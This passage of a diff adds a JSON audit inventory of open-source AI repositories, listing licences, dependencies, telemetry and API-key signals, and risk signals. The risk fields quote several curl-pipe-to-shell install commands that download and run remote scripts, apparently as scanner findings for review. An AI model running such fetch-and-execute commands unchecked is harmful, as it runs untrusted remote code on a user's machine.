+          "eval/ss_pro_gpt4o_omniv2.py: openai.",
+          "omnitool/gradio/app.py: anthropic.",
+          "omnitool/gradio/app_new.py: anthropic.",
+          "omnitool/gradio/app_streamlit.py: anthropic.",
+          "omnitool/gradio/loop.py: anthropic.",
+          "omnitool/gradio/agent/anthropic_agent.py: anthropic."
+        ],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          "README.md: huggingface",
+          "requirements.txt: huggingface",
+          "eval/ss_pro_gpt4o_omniv2.py: OPENAI_API_KEY",
+          "omnitool/readme.md: huggingface",
+          "util/utils.py: huggingface",
+          "util/yolov9.py: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 78
+    },
+    {
+      "name": "BrowserGym",
+      "category": "evaluation",
+      "url": "https://github.com/ServiceNow/BrowserGym.git",
+      "priority": "MEDIUM/HIGH",
+      "kind": "web-agent benchmark",
+      "status": "cloned",
+      "commit": "c05d7f38f4f788d6e4ee960512c3d5c8aabc6e42",
+      "commit_date": "2026-09-27T14:43:44-06:00",
+      "branch": "main",
+      "size_mb": 2.7,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 60,
+        "HTML": 2,
+        "JavaScript": 2
+      },
+      "dependencies": {
+        "manifest:python:pyproject.toml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "demo_agent/agent.py: openai.",
+          "browsergym/experiments/src/browsergym/experiments/loop.py: openai."
+        ],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          "README.md: OPENAI_API_KEY",
+          "demo_agent/environment.yml: huggingface",
+          "dev/environment.yaml: huggingface",
+          ".github/workflows/pypi.yml: GITHUB_TOKEN",
+          ".github/workflows/unit_tests.yml: OPENAI_API_KEY",
+          "browsergym/assistantbench/README.md: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 205
+    },
+    {
+      "name": "WindowsAgentArena",
+      "category": "evaluation",
+      "url": "https://github.com/microsoft/WindowsAgentArena.git",
+      "priority": "MEDIUM",
+      "kind": "desktop computer-use benchmark",
+      "status": "cloned",
+      "commit": "6d39ed88c545a0d40a7a02e39b928e278df7332b",
+      "commit_date": "2024-11-20T12:34:21+01:00",
+      "branch": "main",
+      "size_mb": 5.9,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 127,
+        "Shell": 10,
+        "C/C++ header": 3,
+        "CUDA": 2,
+        "C++": 2,
+        "PowerShell": 2
+      },
+      "dependencies": {
+        "python:requirements.txt": [
+          "azure-ai-ml",
+          "azure-identity",
+          "azureml-core",
+          "azureml-dataset-runtime",
+          "pandas"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "README.md: openai.",
+          "src/win-arena-container/client/mm_agents/navi/agent.py: openai.",
+          "src/win-arena-container/client/mm_agents/navi/gpt/gpt4v_oai.py: openai."
+        ],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          "README.md: OPENAI_API_KEY",
+          "scripts/run-local.sh: OPENAI_API_KEY",
+          "scripts/run.sh: OPENAI_API_KEY",
+          "scripts/run_azure.py: OPENAI_API_KEY",
+          "src/win-arena-container/client/evaluation_examples_windows/examples/chrome/7b6c7e24-c58a-49fc-a5bb-d57b80e5b4c3-wos.json: huggingface",
+          "src/win-arena-container/client/evaluation_examples_windows/examples_noctxt/chrome/7b6c7e24-c58a-49fc-a5bb-d57b80e5b4c3-wos.json: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "scripts/azure_files/compute-instance-startup.sh: sudo apt"
+        ],
+        "remote_code_load": [
+          "src/win-arena-container/client/mm_agents/navi/gpt/phi3_azure.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 514
+    },
+    {
+      "name": "llama.cpp",
+      "category": "inference",
+      "url": "https://github.com/ggml-org/llama.cpp.git",
+      "priority": "CRITICAL",
+      "kind": "inference engine",
+      "status": "cloned",
+      "commit": "d89651a7b205c03c4a0b13cd0646d400dc929f79",
+      "commit_date": "2026-10-05T08:32:07+05:30",
+      "branch": "master",
+      "size_mb": 169.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "C++",
+      "language_mix": {
+        "C++": 599,
+        "C/C++ header": 377,
+        "TypeScript": 335,
+        "CUDA": 190,
+        "Python": 155,
+        "C": 91
+      },
+      "dependencies": {
+        "manifest:python:requirements.txt": [
+          "(no required deps)"
+        ],
+        "manifest:node:tools/ui/package.json": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "convert_hf_to_gguf_update.py: mistralai",
+          "conversion/base.py: mistralai",
+          "conversion/llama.py: mistralai",
+          "conversion/llava.py: mistralai",
+          "conversion/mamba.py: mistralai",
+          "conversion/mistral3.py: mistralai"
+        ],
+        "telemetry_sdk": [
+          "tools/imatrix/README.md: amplitude",
+          "tools/ui/src/lib/vendors/nerdamer-prime/Algebra.js: amplitude",
+          "tools/ui/tests/stories/fixtures/data-analysis.ts: Amplitude"
+        ],
+        "api_key_env": [
+          "CONTRIBUTING.md: HuggingFace",
+          "convert_hf_to_gguf.py: huggingface",
+          "convert_hf_to_gguf_update.py: huggingface",
+          "convert_llama_ggml_to_gguf.py: HuggingFace",
+          "convert_lora_to_gguf.py: huggingface",
+          "ci/run.sh: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "README.md: curl -LsSf https://llama.app/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "docs/build.md: sudo apt",
+          ".github/workflows/build-3rd-party.yml: sudo apt",
+          ".github/workflows/build-and-test-snapdragon.yml: sudo apt",
+          ".github/workflows/build-cpu.yml: sudo apt",
+          ".github/workflows/build-cross.yml: sudo apt",
+          ".github/workflows/build-cuda-ubuntu.yml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 3685
+    },
+    {
+      "name": "ollama",
+      "category": "inference",
+      "url": "https://github.com/ollama/ollama.git",
+      "priority": "CRITICAL",
+      "kind": "model serving",
+      "status": "cloned",
+      "commit": "42e911bc3d05798cad729cb474bf62f378cb2e26",
+      "commit_date": "2026-10-02T11:52:27-07:00",
+      "branch": "main",
+      "size_mb": 46.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Go",
+      "language_mix": {
+        "Go": 784,
+        "TypeScript": 109,
+        "C/C++ header": 44,
+        "Shell": 10,
+        "C++": 5,
+        "Objective-C": 4
+      },
+      "dependencies": {
+        "node:app/ui/app/package.json": [
+          "@headlessui/react",
+          "@heroicons/react",
+          "@tanstack/react-query",
+          "@tanstack/react-router",
+          "@tanstack/react-router-devtools",
+          "clsx",
+          "framer-motion",
+          "katex",
+          "micromark-extension-llm-math",
+          "ollama",
+          "react",
+          "react-dom",
+          "rehype-katex",
+          "rehype-prism-plus",
+          "rehype-raw",
+          "rehype-sanitize",
+          "remark-math",
+          "streamdown",
+          "unist-builder",
+          "unist-util-parents"
+        ],
+        "go:go.mod": [
+          "github.com/containerd/console",
+          "github.com/gin-gonic/gin",
+          "github.com/google/go-cmp",
+          "github.com/google/uuid",
+          "github.com/ledongthuc/pdf",
+          "github.com/mattn/go-sqlite3",
+          "github.com/olekukonko/tablewriter",
+          "github.com/spf13/cobra",
+          "github.com/stretchr/testify",
+          "golang.org/x/sync",
+          "golang.org/x/sys"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "create/metadata.go: cohere",
+          "middleware/anthropic.go: anthropic.",
+          "middleware/anthropic_test.go: anthropic.",
+          "middleware/openai.go: openai.",
+          "middleware/openai_encoding_format_test.go: openai.",
+          "middleware/openai_test.go: openai."
+        ],
+        "telemetry_sdk": [
+          "mlxrunner/status_memory.go: telemetry",
+          "cmd/launch/claude_desktop_test.go: telemetry"
+        ],
+        "api_key_env": [
+          "integration/create_test.go: HuggingFace",
+          "llm/llama_server_test.go: OPENAI_API_KEY",
+          "server/images.go: huggingface",
+          "server/images_test.go: huggingface",
+          "server/show_safetensors.go: HuggingFace",
+          "cmd/bench/bench.go: OPENAI_API_KEY"
+        ],
+        "auth_required": [
+          "cmd/launch/models.go: sign in to use",
+          "internal/proxy/claude_desktop.go: Sign in to Ollama to use",
+          "internal/proxy/codex_desktop_errors.go: sign in to Ollama to use",
+          "internal/proxy/codex_desktop_errors_test.go: sign in to Ollama to use"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "README.md: curl -fsSL https://ollama.com/install.sh | sh",
+          "cmd/launch/claude.go: curl -fsSL https://claude.ai/install.sh | bash",
+          "cmd/launch/claude_test.go: curl -fsSL https://claude.ai/install.sh | bash",
+          "cmd/launch/hermes.go: curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
+          "cmd/launch/kimi.go: curl -LsSf https://code.kimi.com/install.sh | bash",
+          "cmd/launch/muse.go: curl -fsSL https://dev.meta.ai/install.sh | bash"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "docs/development.md: sudo apt",
+          "scripts/build_linux.sh: sudo apt",
+          "scripts/install.sh: sudo apt",
+          ".github/workflows/test.yaml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 1335
+    },
+    {
+      "name": "lancedb",
+      "category": "knowledge",
+      "url": "https://github.com/lancedb/lancedb.git",
+      "priority": "CRITICAL",
+      "kind": "embedded vector DB",
+      "status": "cloned",
+      "commit": "7f5933594f42eeeec1ce73a7ce8e0cd0113cbd82",
+      "commit_date": "2026-10-03T21:30:13-07:00",
+      "branch": "main",
+      "size_mb": 21.5,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Rust",
+      "language_mix": {
+        "Rust": 149,
+        "Python": 91,
+        "TypeScript": 51,
+        "Java": 9,
+        "Shell": 7,
+        "HTML": 3
+      },
+      "dependencies": {
+        "python:python/pyproject.toml": [
+          "InstructorEmbedding",
+          "adlfs",
+          "aiohttp",
+          "awscli",
+          "boto3",
+          "botocore",
+          "cohere",
+          "colpali-engine",
+          "datafusion",
+          "deprecation",
+          "duckdb",
+          "google-genai",
+          "huggingface_hub",
+          "ibm-watsonx-ai",
+          "lance-namespace",
+          "mkdocs",
+          "mkdocs-jupyter",
+          "mkdocs-material",
+          "mkdocstrings-python",
+          "numpy",
+          "ollama",
+          "open-clip-torch",
+          "openai",
+          "opentelemetry-api",
+          "opentelemetry-sdk",
+          "overrides",
+          "packaging",
+          "pandas",
+          "pillow",
+          "polars",
+          "pre-commit",
+          "pyarrow",
+          "pyarrow-stubs",
+          "pydantic",
+          "pylance",
+          "pyright",
+          "pytest",
+          "pytest-asyncio",
+          "pytest-mock",
+          "pytz"
+        ],
+        "node:nodejs/package.json": [
+          "@opentelemetry/api",
+          "reflect-metadata"
+        ],
+        "manifest:rust:Cargo.toml": [
+          "(no required deps)"
+        ],
+        "manifest:java:java/pom.xml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "deny.toml: openai.",
+          "ci/mock_openai.py: openai.",
+          "nodejs/package.json: openai.",
+          "python/pyproject.toml: openai.",
+          "python/PYTHON_THIRD_PARTY_LICENSES.md: cohere",
+          "nodejs/lancedb/embedding/openai.ts: openai."
+        ],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          "ci/check_breaking_changes.py: GITHUB_TOKEN",
+          "nodejs/Cargo.toml: huggingface",
+          "nodejs/NODEJS_THIRD_PARTY_LICENSES.md: huggingface",
+          "nodejs/package.json: huggingface",
+          "nodejs/pnpm-lock.yaml: huggingface",
+          "nodejs/pnpm-workspace.yaml: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          ".github/workflows/license-header-check.yml: curl -s https://raw.githubusercontent.com/lluissm/license-header-check"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/cargo-publish.yml: sudo apt",
+          ".github/workflows/codex-fix-ci.yml: sudo apt",
+          ".github/workflows/codex-update-lance-dependency.yml: sudo apt",
+          ".github/workflows/docs.yml: sudo apt",
+          ".github/workflows/nodejs.yml: sudo apt",
+          ".github/workflows/npm-publish.yml: sudo apt"
+        ],
+        "remote_code_load": [
+          "python/python/lancedb/embeddings/utils.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 791
+    },
+    {
+      "name": "local-rag",
+      "category": "knowledge",
+      "url": "https://github.com/leestott/local-rag.git",
+      "priority": "LOW/MEDIUM",
+      "kind": "small local RAG reference",
+      "status": "cloned",
+      "commit": "3777b94616f47157f3c0c8ca76bd8b81c6ac845d",
+      "commit_date": "2026-03-13T11:42:39Z",
+      "branch": "main",
+      "size_mb": 2.2,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "JavaScript",
+      "language_mix": {
+        "JavaScript": 7,
+        "HTML": 2
+      },
+      "dependencies": {
+        "node:package.json": [
+          "better-sqlite3",
+          "express",
+          "foundry-local-sdk"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [
+          "docs/15-meter-installation.md: telemetry"
+        ],
+        "api_key_env": [
+          "README.md: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 48
+    },
+    {
+      "name": "graphiti",
+      "category": "memory",
+      "url": "https://github.com/getzep/graphiti.git",
+      "priority": "CRITICAL",
+      "kind": "temporal knowledge graph",
+      "status": "cloned",
+      "commit": "b7fc30f2a1e288266760640164a37bdb7d1d0f28",
+      "commit_date": "2026-10-04T17:43:26Z",
+      "branch": "main",
+      "size_mb": 21.7,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 188,
+        "Shell": 3
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "anthropic",
+          "boto3",
+          "falkordb",
+          "falkordblite",
+          "gliner2",
+          "google-genai",
+          "groq",
+          "ipykernel",
+          "jupyterlab",
+          "kuzu",
+          "langchain-anthropic",
+          "langchain-aws",
+          "langchain-openai",
+          "langgraph",
+          "langsmith",
+          "neo4j",
+          "numpy",
+          "openai",
+          "opensearch-py",
+          "opentelemetry-api",
+          "opentelemetry-sdk",
+          "posthog",
+          "pydantic",
+          "pyright",
+          "pytest",
+          "pytest-asyncio",
+          "pytest-xdist",
+          "python-dotenv",
+          "redis",
+          "ruff",
+          "sentence-transformers",
+          "tenacity",
+          "transformers",
+          "voyageai"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "README.md: openai.",
+          "examples/azure-openai/README.md: openai.",
+          "examples/gliner2/gliner2_neo4j.py: OpenAI.",
+          "examples/gliner2/README.md: openai.",
+          "graphiti_core/cross_encoder/openai_reranker_client.py: openai.",
+          "graphiti_core/embedder/openai.py: openai."
+        ],
+        "telemetry_sdk": [
+          "AGENTS.md: PostHog",
+          "pyproject.toml: posthog",
+          "README.md: PostHog",
+          ".github/secret_scanning.yml: PostHog",
+          "graphiti_core/graphiti.py: telemetry",
+          "mcp_server/README.md: Telemetry"
+        ],
+        "api_key_env": [
+          "AGENTS.md: OPENAI_API_KEY",
+          "CLAUDE.md: OPENAI_API_KEY",
+          "CONTRIBUTING.md: OPENAI_API_KEY",
+          "docker-compose.test.yml: OPENAI_API_KEY",
+          "docker-compose.yml: OPENAI_API_KEY",
+          "README.md: OPENAI_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "mcp_server/README.md: curl -LsSf https://astral.sh/uv/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": [
+          "docker-compose.test.yml: urllib.request.urlopen(",
+          "docker-compose.yml: urllib.request.urlopen("
+        ]
+      },
+      "files": 384
+    },
+    {
+      "name": "letta",
+      "category": "memory",
+      "url": "https://github.com/letta-ai/letta.git",
+      "priority": "CRITICAL",
+      "kind": "historical Letta",
+      "status": "cloned",
+      "commit": "5bcdd177d70fa2b31a754cfcd801e77b2e1ab16a",
+      "commit_date": "2026-09-10T10:59:06-07:00",
+      "branch": "main",
+      "size_mb": 0.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "unknown",
+      "language_mix": {},
+      "dependencies": {},
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [
+          "PRIVACY.md: telemetry"
+        ],
+        "api_key_env": [
+          ".github/workflows/issue-guard.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 12
+    },
+    {
+      "name": "letta-code",
+      "category": "memory",
+      "url": "https://github.com/letta-ai/letta-code.git",
+      "priority": "CRITICAL",
+      "kind": "stateful agents + memory",
+      "status": "cloned",
+      "commit": "f898fda60932b34ddbcfd389ea414515b0a5d272",
+      "commit_date": "2026-10-04T16:38:39-07:00",
+      "branch": "main",
+      "size_mb": 51.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 2153,
+        "JavaScript": 14,
+        "Shell": 7,
+        "Python": 7
+      },
+      "dependencies": {
+        "manifest:python:python/pyproject.toml": [
+          "(no required deps)"
+        ],
+        "node:package.json": [
+          "@earendil-works/pi-ai",
+          "@janhapke/sharp-electron",
+          "@letta-ai/letta-agent-sdk",
+          "@letta-ai/letta-client",
+          "@letta-ai/trajectory",
+          "@modelcontextprotocol/sdk",
+          "@pierre/diffs",
+          "@scarf/scarf",
+          "@shikijs/langs",
+          "cron-parser",
+          "cross-spawn",
+          "glob",
+          "ink",
+          "ink-link",
+          "node-pty",
+          "open",
+          "react",
+          "sharp",
+          "shiki",
+          "strip-ansi",
+          "ws"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "scripts/isolated-unit-tests.json: openai.",
+          "src/agent/available-models.test.ts: openai.",
+          "src/agent/model.ts: anthropic.",
+          "src/agent/turn-recovery-policy.test.ts: openai.",
+          "src/auth/openai-oauth.ts: openai.",
+          "src/backend/local-provider-errors.test.ts: openai."
+        ],
+        "telemetry_sdk": [
+          "AGENTS.md: telemetry",
+          "biome.json: telemetry",
+          "scripts/check-layer-boundaries.js: telemetry",
+          "scripts/isolated-unit-tests.json: telemetry",
+          "src/headless-mod-adapter.ts: telemetry",
+          "src/headless-telemetry-exit.test.ts: telemetry"
+        ],
+        "api_key_env": [
+          "AGENTS.md: GITHUB_TOKEN",
+          "docs/nix.md: OPENAI_API_KEY",
+          "src/local-backend-provider.smoke.test.ts: OPENAI_API_KEY",
+          ".github/agent-prompts/builtin-skills-agent-watch.md: GITHUB_TOKEN",
+          ".github/agent-prompts/claude-agent-watch.md: GITHUB_TOKEN",
+          ".github/agent-prompts/codex-agent-watch.md: GITHUB_TOKEN"
+        ],
+        "auth_required": [
+          "scripts/agent-watch/verify-pr-identity.ts: login is required",
+          "scripts/builtin-skills-watch/aggregate-results.ts: login are required",
+          "scripts/builtin-skills-watch/reconcile-results.ts: login is required",
+          "scripts/builtin-skills-watch/update-tracker.ts: login is required",
+          "scripts/claude-watch/update-tracker.test.ts: login is required",
+          "scripts/claude-watch/update-tracker.ts: login is required"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          ".github/workflows/ci.yml: curl -fsSL https://ollama.com/install.sh | sh"
+        ],
+        "postinstall_hook": [
+          "package.json: \"postinstall\""
+        ],
+        "sudo_in_docs": [
+          "src/permissions/permissions-analyzer.test.ts: sudo apt"
+        ],
+        "remote_code_load": [
+          "hooks/memory_logger.py: urllib.request.urlopen(",
+          "src/skills/builtin/image-generation/SKILL.md: urllib.request.urlopen("
+        ]
+      },
+      "files": 2445
+    },
+    {
+      "name": "mem0",
+      "category": "memory",
+      "url": "https://github.com/mem0ai/mem0.git",
+      "priority": "CRITICAL",
+      "kind": "persistent memory",
+      "status": "cloned",
+      "commit": "abb81c88e1f738a8117d8293530fbc31a5ef8fd9",
+      "commit_date": "2026-10-01T21:46:18+05:30",
+      "branch": "main",
+      "size_mb": 34.6,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 335,
+        "Python": 262,
+        "JavaScript": 14,
+        "Shell": 4,
+        "CSS": 2
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "azure-identity",
+          "azure-search-documents",
+          "boto3",
+          "cassandra-driver",
+          "chromadb",
+          "databricks-sdk",
+          "dbutils",
+          "elasticsearch",
+          "faiss-cpu",
+          "fastembed",
+          "google-genai",
+          "google-generativeai",
+          "groq",
+          "httpx",
+          "isort",
+          "langchain",
+          "langchain-aws",
+          "langchain-community",
+          "langchain-core",
+          "litellm",
+          "ollama",
+          "openai",
+          "opensearch-py",
+          "oracledb",
+          "pinecone",
+          "pinecone-text",
+          "posthog",
+          "pre-commit",
+          "protobuf",
+          "psycopg",
+          "psycopg-pool",
+          "pydantic",
+          "pymilvus",
+          "pymochow",
+          "pymongo",
+          "pymysql",
+          "pytest",
+          "pytest-asyncio",
+          "pytest-mock",
+          "pytz"
+        ],
+        "node:mem0-ts/package.json": [
+          "axios",
+          "openai",
+          "uuid",
+          "zod"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "LLM.md: openai.",
+          "docs/docs.json: cohere",
+          "docs/llms.txt: OpenAI.",
+          "mem0/AGENTS.md: Cohere",
+          "mem0-ts/package.json: cohere",
+          "mem0-ts/pnpm-lock.yaml: cohere"
+        ],
+        "telemetry_sdk": [
+          "pyproject.toml: posthog",
+          "docs/docs.json: posthog",
+          "docs/llms.txt: telemetry",
+          "integrations/AGENTS.md: telemetry",
+          "scripts/oss-to-platform-migrate.sh: posthog",
+          "server/main.py: telemetry"
+        ],
+        "api_key_env": [
+          "LLM.md: huggingface",
+          "README.md: huggingface",
+          ".github/AGENTS.md: GITHUB_TOKEN",
+          "docs/docs.json: huggingface",
+          "docs/llms.txt: OPENAI_API_KEY",
+          "mem0/AGENTS.md: HuggingFace"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "tests/test_oss_to_platform_migrate.py: curl -fsSL file://{SCRIPT} | bash",
+          "examples/nemoclaw/setup-mem0-nemoclaw.sh: curl -fsSL https://raw.githubusercontent.com/mem0ai/mem0/main/scripts/",
+          "integrations/hermes-plugin-mem0/_setup.py: curl -fsSL https://ollama.com/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/ci.yml: sudo apt",
+          "examples/nemoclaw/setup-mem0-nemoclaw.sh: sudo apt"
+        ],
+        "remote_code_load": [
+          "cli/python/src/mem0_cli/telemetry_sender.py: urllib.request.urlopen(",
+          "integrations/hermes-plugin-mem0/_setup.py: urllib.request.urlopen(",
+          "integrations/agent-plugin-core/python/memory_core.py: urllib.request.urlopen(",
+          "integrations/agent-plugin-core/python/telemetry.py: urllib.request.urlopen(",
+          "integrations/antigravity-plugin/core/memory_core.py: urllib.request.urlopen(",
+          "integrations/antigravity-plugin/core/telemetry.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 1835
+    },
+    {
+      "name": "memlocal_core",
+      "category": "memory",
+      "url": "https://github.com/memlocal/memlocal_core.git",
+      "priority": "HIGH",
+      "kind": "local-first memory engine",
+      "status": "cloned",
+      "commit": "d46d09c54b30da0bd2a4629ae61daa3b42be3c59",
+      "commit_date": "2026-06-02T14:05:09+05:30",
+      "branch": "main",
+      "size_mb": 1.3,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Rust",
+      "language_mix": {
+        "Rust": 55,
+        "Dart": 33,
+        "C/C++ header": 8,
+        "C++": 8,
+        "Swift": 7,
+        "Kotlin": 4
+      },
+      "dependencies": {
+        "rust:Cargo.toml": [
+          "chrono",
+          "cozo",
+          "flutter_rust_bridge",
+          "hex",
+          "log",
+          "rayon",
+          "reqwest",
+          "serde",
+          "serde_json",
+          "sha2",
+          "thiserror",
+          "uuid"
+        ],
+        "manifest:java:flutter/android/build.gradle": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "README.MD: openai.",
+          "docs/superpowers/specs/2026-05-30-memlocal-flutter-package-design.md: openai.",
+          "src/http/anthropic_client.rs: anthropic.",
+          "src/http/openai_client.rs: openai.",
+          "src/http/openai_embeddings.rs: openai."
+        ],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          "flutter/README.md: OPENAI_API_KEY",
+          "tests/integration_test.rs: OPENAI_API_KEY",
+          "flutter/example/README.md: OPENAI_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 272
+    },
+    {
+      "name": "supermemory",
+      "category": "memory",
+      "url": "https://github.com/supermemoryai/supermemory.git",
+      "priority": "CRITICAL",
+      "kind": "memory + context + RAG",
+      "status": "cloned",
+      "commit": "ac2180498223cce078eb263b9d240fdc2f5c3548",
+      "commit_date": "2026-10-05T00:27:04Z",
+      "branch": "main",
+      "size_mb": 75.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 305,
+        "Python": 30,
+        "CSS": 6,
+        "HTML": 2,
+        "JavaScript": 1
+      },
+      "dependencies": {
+        "python:packages/docs-test/requirements.txt": [
+          "anthropic",
+          "httpx",
+          "openai",
+          "python-dotenv",
+          "supermemory"
+        ],
+        "node:package.json": [
+          "@ai-sdk/anthropic",
+          "@ai-sdk/cerebras",
+          "@ai-sdk/google",
+          "@ai-sdk/openai",
+          "@anthropic-ai/sdk",
+          "@google/genai",
+          "@google/generative-ai",
+          "@hono/zod-validator",
+          "@scalar/hono-api-reference",
+          "@types/flubber",
+          "@vanilla-extract/recipes",
+          "ai",
+          "alchemy",
+          "atmn",
+          "better-auth",
+          "boxen",
+          "cloudflare",
+          "compromise",
+          "dedent",
+          "destr",
+          "drizzle-orm",
+          "drizzle-zod",
+          "file-type",
+          "hono-openapi",
+          "nanoid",
+          "neverthrow",
+          "pg",
+          "pino",
+          "postgres",
+          "random-word-slugs",
+          "resend",
+          "zod",
+          "zod-openapi"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "apps/mcp/src/server/index.ts: openai.",
+          "apps/sdk-playground/src/lib/chat-handlers.ts: OpenAI.",
+          "packages/ai-sdk/README.md: openai.",
+          "packages/openai-sdk-python/README.md: openai.",
+          "packages/tools/README.md: anthropic.",
+          "packages/openai-sdk-python/tests/test_middleware.py: openai."
+        ],
+        "telemetry_sdk": [
+          "CLAUDE.md: Sentry",
+          "package.json: sentry",
+          "README.md: telemetry",
+          "apps/mcp/package.json: posthog",
+          "apps/mcp/pnpm-lock.yaml: posthog",
+          "apps/mcp/pnpm-workspace.yaml: posthog"
+        ],
+        "api_key_env": [
+          ".github/workflows/claude-auto-fix-ci.yml: GITHUB_TOKEN",
+          "apps/sdk-playground/README.md: OPENAI_API_KEY",
